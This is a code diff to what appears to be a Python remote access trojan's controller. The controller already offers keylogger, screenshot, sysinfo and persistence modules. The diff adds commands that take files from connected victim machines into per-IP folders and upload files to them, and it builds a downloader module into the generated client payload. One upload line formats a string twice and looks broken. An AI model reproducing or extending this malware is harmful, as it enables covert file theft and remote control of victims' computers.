@@ -443,6 +443,54 @@ class COMMCENTER:
         else:
             pull.error("You need to connect before execute this command!")
 
+    def c_download(self, args):
+        if self.CURRENT:
+            if len(args) == 3:
+                self.CURRENT[1].send_data("download:%s" % (args[1]))
+                result = self.CURRENT[1].recv_data()
+                dirname = os.path.dirname(__file__)
+                dirname = os.path.join( dirname, 'downloads' )
+                if not os.path.isdir(dirname):
+                    os.mkdir(dirname)
+                dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
+                if not os.path.isdir(dirname):
+                    os.mkdir(dirname)
+                fullpath = os.path.join( dirname, args[1] )
+                fl = open( fullpath
+                , 'wb' )
+                fl.write( result )
+                fl.close()
+                pull.print("Downloaded: [" + pull.GREEN + fullpath + pull.END + "]")
+            else:
+                pull.error("Invalid Syntax!")
+        else:
+            pull.error("You need to connect before execute this command!")
+
+    def get_file(self, path):
+        if os.path.isfile(path):
+            with open(path
+            , 'rb') as fl:
+                return fl.read()
+        else:
+            return False
+
+    def c_upload(self, args):
+        if self.CURRENT:
+            if len(args) == 3:
+                file = self.get_file(args[1])
+                if file:
+                    # path, local_path
+                    self.CURRENT[1].send_data("upload:%s" % (args[2]) % (file))
+                    result = self.CURRENT[1].recv_data()
+                    if result.strip(" "):
+                        print(result)
+                else:
+                    pull.error("File doesn't exist!")
+            else:
+                pull.error("Invalid Syntax!")
+        else:
+            pull.error("You need to connect before execute this command!")
+
     def c_sysinfo(self):
         if self.CURRENT:
             self.CURRENT[1].send_data("sysinfo:")
@@ -551,6 +599,10 @@ class INTERFACE(COMMCENTER):
                     self.c_clear()
                 elif vals[0] == "keylogger":
                     self.c_keylogger(vals)
+                elif vals[0] == "download":
+                    self.c_download(vals)
+                elif vals[0] == "upload":
+                    self.c_upload(vals)
                 elif vals[0] == "sysinfo":
                     self.c_sysinfo()
                 elif vals[0] == "screenshot":
@@ -586,6 +638,7 @@ class GENERATOR:
         self.v_persistence = self.get_persistence()
         self.v_sysinfo = self.get_sysinfo()
         self.v_screenshot = self.get_screenshot()
+        self.v_downloader = self.get_downloader()
         self.v_client  = self.get_client()
         self.v_main    = self.get_main()
 
@@ -641,6 +694,13 @@ class GENERATOR:
         data = fl.read()
         fl.close()
         return data
+    
+    def get_downloader(self):
+        topen = os.path.join(self.pather, 'downloader.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
 
     def get_screenshot(self):
         topen = os.path.join(self.pather, 'screenshot.py')
@@ -678,7 +738,7 @@ class GENERATOR:
         time.sleep(2)
         pull.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+                self.v_screenshot + "\n\n" + self.v_downloader + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating source code ...")
         fl = open(self.output, 'w')
@@ -692,7 +752,7 @@ class GENERATOR:
         time.sleep(2)
         pull.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
-                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+                self.v_screenshot + "\n\n" + self.v_downloader + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
         pull.function("Generating one time code for binary ")
         self.flname = self.tmp_dir()
